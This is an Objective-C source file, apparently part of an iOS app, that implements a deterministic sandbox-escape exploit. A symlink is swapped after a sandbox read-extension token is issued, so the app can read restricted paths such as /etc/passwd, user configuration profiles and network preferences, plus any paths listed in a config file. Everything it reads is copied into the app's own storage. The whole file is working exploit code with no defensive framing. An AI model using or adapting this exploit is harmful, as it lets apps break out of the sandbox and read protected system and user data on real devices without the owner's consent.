// Sbx.m - sandbox_extension TOCTOU reader (deterministic, no race required)
//
// Sequence per item, all inside the app's own container:
//   1. create file  <tmp>/s            (something the app is allowed to touch)
//   2. symlink      <tmp>/l -> <tmp>/s
//   3. token = sandbox_extension_issue_file("com.apple.app-sandbox.read", <tmp>/l, 0)
//        the kernel resolves the symlink at issue time, so the token is minted
//        against a path the app already owns
//   4. repoint      <tmp>/l -> <target>   (the restricted path)
//   5. sandbox_extension_consume(token)   then opendir()/read() through <tmp>/l
// The access path is never checked against the token path, so the swap wins.
//
// Writes are still refused: the read class does not carry write.

#import "Sbx.h"

#import <dirent.h>
#import <errno.h>
#import <fcntl.h>
#import <string.h>
#import <sys/stat.h>
#import <unistd.h>

extern char   *sandbox_extension_issue_file(const char *cls, const char *path, uint64_t flags);
extern int64_t sandbox_extension_consume(const char *token);
extern void    sandbox_extension_release(int64_t handle);

static NSString *gSbxDocs;
static NSString *gSbxOut;
static NSMutableArray *gSbxProduced;

static void sbxLog(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"[sbx] %@", s);

    NSString *p = [gSbxDocs stringByAppendingPathComponent:@"sbx.log"];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:p];
    if (fh == nil) {
        [[NSFileManager defaultManager] createFileAtPath:p contents:nil attributes:nil];
        fh = [NSFileHandle fileHandleForWritingAtPath:p];
    }
    [fh seekToEndOfFile];
    [fh writeData:[[s stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
    [fh closeFile];
}

static BOOL sbxPut(NSString *name, NSData *data) {
    NSString *p = [gSbxOut stringByAppendingPathComponent:name];
    if (![data writeToFile:p atomically:YES]) return NO;
    [gSbxProduced addObject:name];
    return YES;
}

static void sbxDumpDir(NSString *tag, const char *linkPath) {
    DIR *dp = opendir(linkPath);
    if (dp == NULL) {
        sbxLog(@"DIR[%@] opendir failed errno=%d (%s)", tag, errno, strerror(errno));
        return;
    }
    NSMutableArray *names = [NSMutableArray array];
    struct dirent *de;
    while ((de = readdir(dp)) != NULL && names.count < 4000) {
        NSString *n = [NSString stringWithUTF8String:de->d_name];
        if (n != nil && ![n isEqualToString:@"."] && ![n isEqualToString:@".."]) {
            [names addObject:n];
        }
    }
    closedir(dp);

    NSArray *sorted = [names sortedArrayUsingSelector:@selector(compare:)];
    NSString *body = [[sorted componentsJoinedByString:@"\n"] stringByAppendingString:@"\n"];
    sbxPut([tag stringByAppendingString:@".dir"],
           [body dataUsingEncoding:NSUTF8StringEncoding]);
    sbxLog(@"DIR[%@] entries=%lu", tag, (unsigned long)names.count);
}

static void sbxReadFile(NSString *tag, const char *linkPath, int64_t size) {
    int fd = open(linkPath, O_RDONLY);
    if (fd < 0) {
        sbxLog(@"READ[%@] open failed errno=%d (%s)", tag, errno, strerror(errno));
        return;
    }

    NSMutableData *all = [NSMutableData data];
    unsigned char buf[65536];
    ssize_t got;
    while ((got = read(fd, buf, sizeof(buf))) > 0) {
        [all appendBytes:buf length:(NSUInteger)got];
        if (all.length > 8 * 1000 * 1000) break;
    }
    close(fd);

    sbxPut([tag stringByAppendingString:@".bin"], all);
    sbxLog(@"READ[%@] %lu bytes (stat size=%lld)", tag, (unsigned long)all.length, size);
}

static void sbxOne(NSString *tag, NSString *target) {
    NSString *tmp = NSTemporaryDirectory();
    const char *s = [[tmp stringByAppendingPathComponent:@"s"] UTF8String];
    const char *l = [[tmp stringByAppendingPathComponent:@"l"] UTF8String];
    const char *p = [target UTF8String];

    [[@"x" dataUsingEncoding:NSUTF8StringEncoding] writeToFile:@(s) atomically:YES];

    unlink(l);
    if (symlink(s, l) != 0) {
        sbxLog(@"SETUP[%@] symlink s failed errno=%d", tag, errno);
        return;
    }

    char *token = sandbox_extension_issue_file("com.apple.app-sandbox.read", l, 0);
    if (token == NULL) {
        sbxLog(@"ISSUE[%@] returned NULL - this build has no issue right for the class", tag);
        unlink(l);
        return;
    }
    sbxLog(@"ISSUE[%@] ok", tag);

    unlink(l);
    if (symlink(p, l) != 0) {
        sbxLog(@"SWAP[%@] symlink target failed errno=%d", tag, errno);
        free(token);
        return;
    }

    int64_t h = sandbox_extension_consume(token);
    sbxLog(@"CONSUME[%@] handle=%lld", tag, h);

    struct stat st;
    if (stat(l, &st) != 0) {
        sbxLog(@"STAT[%@] failed errno=%d (%s)", tag, errno, strerror(errno));
    } else if ((st.st_mode & 0170000) == 0040000) {
        sbxDumpDir(tag, l);
    } else {
        sbxReadFile(tag, l, (int64_t)st.st_size);
    }

    if (h > 0) sandbox_extension_release(h);
    if (token != NULL) free(token);
    unlink(l);
    unlink(s);
}

int sbxRun(void) {
    gSbxDocs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    gSbxOut = [gSbxDocs stringByAppendingPathComponent:@"out"];
    gSbxProduced = [NSMutableArray array];

    [[NSFileManager defaultManager] createDirectoryAtPath:gSbxOut
                             withIntermediateDirectories:YES attributes:nil error:nil];

    sbxLog(@"=== sbx start ===");

    NSString *q = [NSString stringWithContentsOfFile:[gSbxDocs stringByAppendingPathComponent:@"sbx.txt"]
                                            encoding:NSUTF8StringEncoding error:nil];
    if (q.length == 0) {
        sbxLog(@"sbx.txt empty: running built-in probe set");
        sbxOne(@"etc-passwd",     @"/etc/passwd");
        sbxOne(@"etc-hosts",      @"/etc/hosts");
        sbxOne(@"etc-services",   @"/etc/services");
        sbxOne(@"globalprefs",    @"/var/mobile/Library/Preferences/.GlobalPreferences.plist");
        sbxOne(@"usersettings",   @"/var/mobile/Library/UserConfigurationProfiles/PublicInfo/PublicEffectiveUserSettings.plist");
        sbxOne(@"networkd-prefs", @"/var/preferences/com.apple.networkd.plist");
        sbxOne(@"etc-dir",        @"/etc");
    } else {
        NSArray *lines = [q componentsSeparatedByString:@"\n"];
        for (NSString *line in lines) {
            if (line.length == 0) continue;
            NSArray *p = [line componentsSeparatedByString:@"\t"];
            if (p.count < 2) continue;
            sbxOne(p[0], p[1]);
        }
    }

    NSString *idx = [gSbxProduced componentsJoinedByString:@"\n"];
    if (idx.length > 0) idx = [idx stringByAppendingString:@"\n"];
    [[idx dataUsingEncoding:NSUTF8StringEncoding]
        writeToFile:[gSbxOut stringByAppendingPathComponent:@"sbx_index.txt"] atomically:YES];

    sbxLog(@"=== sbx end, %lu artifacts ===", (unsigned long)gSbxProduced.count);
    return 0;
}
